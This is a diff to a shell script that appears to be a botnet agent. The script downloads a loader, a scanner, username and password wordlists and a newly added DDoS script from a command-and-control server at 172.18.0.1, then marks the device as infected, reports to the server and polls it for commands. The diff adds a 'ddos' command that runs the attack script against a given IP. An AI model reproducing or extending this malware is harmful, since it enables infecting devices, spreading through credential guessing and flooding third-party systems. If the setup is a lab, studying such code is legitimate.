@@ -10,12 +10,14 @@ if [ ! -e $INFECTED ]; then
 	echo 'fetching payloads'
 	curl http://172.18.0.1:8000/payload/loader?device_id="$ID" -o loader # i'm gonna get rid of this device id later, or make it some unique thing like the mac
 	curl http://172.18.0.1:8000/payload/scanner?device_id="$ID" -o scanner # i'm gonna get rid of this device id later, or make it some unique thing like the mac
+	curl http://172.18.0.1:8000/payload/ddos?device_id="$ID" -o dos.sh # i'm gonna get rid of this device id later, or make it some unique thing like the mac
 	curl http://172.18.0.1:8000/wordlist/users?device_id="$ID" -o users.txt
 	curl http://172.18.0.1:8000/wordlist/passwords?device_id="$ID" -o passwords.txt
 	# curl other necessary payloads...
 
 	chmod +x loader
 	chmod +x scanner
+	chmod +x dos.sh
 	touch /tmp/infected # signal this device as infected with all the payloads
 	curl -X POST http://172.18.0.1:8000/infected?device_id="$ID"
 fi
@@ -37,6 +39,8 @@ while true; do # TODO: fix inside of loop
 		./scanner "$IP" "$MASK"
 		curl -X POST "http://172.18.0.1:8000/busy?device_id="$ID"&busystatus=0"
 		curl -X POST "http://172.18.0.1:8000/inst?device_id="$ID"&status=1"
+	elif [[ "$CMD" == "ddos" ]]; then
+		./dos.sh "$IP"
 	fi
 	sleep 10
 done
